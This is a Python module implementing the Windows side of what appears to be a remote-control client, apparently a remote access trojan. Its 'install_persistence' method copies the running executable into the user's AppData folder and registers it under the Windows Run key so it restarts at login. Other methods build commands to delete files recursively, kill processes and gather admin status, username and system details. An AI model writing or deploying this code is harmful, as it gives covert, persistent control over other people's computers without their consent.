import os
import subprocess
import shutil
import sys

from client.platform.base import AbstractPlatform


class WindowsPlatform(AbstractPlatform):

    def list_dir_cmd(self, path=None):
        return f'dir "{path}"' if path else 'dir'

    def current_dir_cmd(self):
        return 'cd'

    def delete_cmd(self, path, recursive=False):
        if recursive:
            return f'rmdir /s /q "{path}"'
        return f'del /q "{path}"'

    def move_cmd(self, src, dst):
        return f'move "{src}" "{dst}"'

    def read_file_cmd(self, path):
        return f'type "{path}"'

    def touch_cmd(self, path):
        return f'type nul > "{path}"'

    def process_list_cmd(self):
        return 'tasklist'

    def kill_process_cmd(self, pid):
        return f'taskkill /F /PID {pid}'

    def pkill_cmd(self, name):
        return f'taskkill /F /IM {name}.exe'

    def network_info_cmd(self):
        return 'ipconfig'

    def install_persistence(self, reg_name, copy_name):
        file_location = os.environ['appdata'] + '\\' + copy_name
        if not os.path.exists(file_location):
            shutil.copyfile(sys.executable, file_location)
            subprocess.call(
                f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                f'/v {reg_name} /t REG_SZ /d "{file_location}"',
                shell=True
            )
            return f'[+] Created Persistence With Reg Key: {reg_name}'
        return '[+] Persistence Already Exists'

    def get_appdata_path(self):
        return os.environ['appdata']

    def check_admin(self):
        import ctypes
        is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        return '[+] User is Admin' if is_admin == 1 else '[-] User is NOT Admin'

    def get_system_user(self):
        try:
            return os.getlogin()
        except Exception:
            return os.environ.get('USERNAME', 'Unknown')

    def get_memory_info(self):
        try:
            output = subprocess.check_output(
                'wmic computersystem get totalphysicalmemory', shell=True
            ).decode()
            lines = output.strip().split('\n')
            if len(lines) > 1:
                bytes_mem = int(lines[1].strip())
                gb_mem = round(bytes_mem / (1024 ** 3), 2)
                return f"Total RAM: {gb_mem} GB"
        except Exception:
            pass
        return None

    def grep_cmd(self, pattern):
        return f'findstr "{pattern}"'

    def clear_screen_cmd(self):
        return 'cls'
